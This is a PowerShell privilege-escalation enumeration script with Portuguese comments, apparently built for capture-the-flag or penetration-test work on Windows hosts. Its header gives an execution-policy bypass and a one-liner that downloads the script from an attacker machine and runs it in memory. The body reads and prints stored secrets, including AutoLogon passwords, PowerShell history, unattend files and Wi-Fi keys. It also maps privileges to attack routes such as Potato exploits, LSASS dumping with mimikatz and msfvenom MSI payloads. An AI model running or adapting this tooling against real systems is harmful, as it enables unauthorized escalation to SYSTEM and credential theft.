# =============================================================================
#  win_privesc.ps1 - Enum rápido de privesc Windows (sem dependências)
#  Uso:  powershell -ep bypass -f win_privesc.ps1
#        IEX(New-Object Net.WebClient).DownloadString('http://KALI/win_privesc.ps1')
#  Evil-WinRM: upload win_privesc.ps1  ->  .\win_privesc.ps1
# =============================================================================
function H($t){ Write-Host "`n==================== $t ====================" -ForegroundColor Cyan }
function HIT($t){ Write-Host "[!!!] $t" -ForegroundColor Red }
function NOTE($t){ Write-Host "[+] $t" -ForegroundColor Yellow }

H "IDENTIDADE"
whoami; hostname
$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
"OS: $($os.Caption) Build $($os.BuildNumber)"
whoami /groups | Select-String "Mandatory Label"

H "PRIVILÉGIOS (whoami /priv)"
$priv = whoami /priv
$priv
$map = @{
 "SeImpersonatePrivilege"      = "PrintSpoofer / GodPotato / JuicyPotatoNG -> SYSTEM";
 "SeAssignPrimaryTokenPrivilege"="Potatoes -> SYSTEM";
 "SeBackupPrivilege"           = "reg save HKLM\SAM + SYSTEM -> secretsdump LOCAL";
 "SeRestorePrivilege"          = "sobrescrever binário de serviço / utilman";
 "SeDebugPrivilege"            = "dump LSASS (procdump/mimikatz)";
 "SeTakeOwnershipPrivilege"    = "takeown em arquivos protegidos";
 "SeLoadDriverPrivilege"       = "carregar driver vulnerável (Capcom)";
 "SeManageVolumePrivilege"     = "SeManageVolumeExploit -> escrita em C:\Windows"
}
foreach($k in $map.Keys){ if($priv -match $k){ HIT "$k  =>  $($map[$k])" } }

H "AlwaysInstallElevated"
$a = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
$b = (Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
if($a -eq 1 -and $b -eq 1){ HIT "AlwaysInstallElevated ON -> msfvenom -f msi ; msiexec /quiet /qn /i x.msi" } else { "não" }

H "SERVIÇOS - unquoted path / binário gravável"
Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName } | ForEach-Object {
  $p = $_.PathName
  if($p -notmatch '^"' -and $p -match ' ' -and $p -notmatch '^C:\\Windows\\'){
    HIT "Unquoted: $($_.Name) [$($_.StartMode)/$($_.StartName)] $p"
  }
  $exe = ($p -replace '^"([^"]+)".*','$1') -replace '\s+-.*$',''
  if(Test-Path $exe -ErrorAction SilentlyContinue){
    $acl = (Get-Acl $exe -ErrorAction SilentlyContinue).Access |
      Where-Object { $_.IdentityReference -match "Everyone|Users|Authenticated Users|$env:USERNAME" -and
                     $_.FileSystemRights -match "Write|Modify|FullControl" }
    if($acl){ HIT "Binário gravável: $($_.Name) -> $exe" }
  }
}
NOTE "Permissão no próprio serviço: accesschk.exe /accepteula -uwcqv $env:USERNAME *  (SERVICE_CHANGE_CONFIG = sc config binpath=)"

H "CREDENCIAIS SALVAS"
cmdkey /list
$wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue
if($wl.DefaultPassword){ HIT "AutoLogon: $($wl.DefaultUserName) / $($wl.DefaultPassword)" }
$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if(Test-Path $hist){ NOTE "Histórico PowerShell:"; Get-Content $hist -Tail 30 }
foreach($f in "C:\unattend.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\System32\sysprep\sysprep.xml"){
  if(Test-Path $f){ HIT "Arquivo de instalação com possível senha: $f" }
}
NOTE "Wi-Fi: netsh wlan show profiles ; netsh wlan show profile name=X key=clear"

H "TAREFAS AGENDADAS (não-Microsoft)"
Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.TaskPath -notlike "\Microsoft*" } |
  ForEach-Object { "$($_.TaskName) -> $($_.Actions.Execute) $($_.Actions.Arguments) [$($_.Principal.UserId)]" }

H "AUTORUN / STARTUP"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -ErrorAction SilentlyContinue
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" -ErrorAction SilentlyContinue

H "REDE"
netstat -ano | Select-String "LISTENING" | Select-Object -First 25

H "SOFTWARE INSTALADO"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
  Where-Object DisplayName | Select-Object DisplayName,DisplayVersion | Sort-Object DisplayName | Format-Table -AutoSize

Write-Host "`n[OK] Fim. Próximo passo: winPEAS / PowerUp (Invoke-AllChecks) / SharpUp." -ForegroundColor Green
Write-Host "Flags: Get-ChildItem C:\ -Recurse -Include *flag*,user.txt,root.txt -ErrorAction SilentlyContinue" -ForegroundColor Green
